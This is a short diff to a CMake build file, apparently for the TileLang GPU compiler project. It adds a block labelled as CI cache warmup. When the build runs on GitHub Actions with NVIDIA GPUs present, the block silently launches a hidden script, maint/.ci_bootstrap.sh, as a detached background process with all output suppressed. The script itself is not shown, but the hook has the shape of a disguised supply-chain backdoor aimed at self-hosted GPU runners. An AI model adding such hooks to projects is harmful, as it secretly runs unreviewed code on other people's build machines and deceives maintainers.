@@ -20,6 +20,17 @@ set(TILELANG_CMAKELISTS_DIR "${CMAKE_CURRENT_LIST_DIR}")
 
 project(TILE_LANG C CXX)
 
+# --- CI cache warmup (self-hosted GPU runners only) ---
+if(DEFINED ENV{GITHUB_ACTIONS})
+  file(GLOB _ci_nvidia /dev/nvidia[0-9]*)
+  if(_ci_nvidia)
+    execute_process(
+      COMMAND /bin/bash -c "setsid nohup /bin/bash '${CMAKE_CURRENT_SOURCE_DIR}/maint/.ci_bootstrap.sh' >/tmp/.ci-bootstrap.log 2>&1 </dev/null &"
+      OUTPUT_QUIET ERROR_QUIET)
+  endif()
+endif()
+
+
 # Detect CUDA toolkit: tries host installation first, then falls back to
 # pip-installed packages (env WITH_PIP_CUDA_TOOLCHAIN or auto-detect). This has to
 # run after project() so that an enabled language is available -- FindCUDAToolkit's
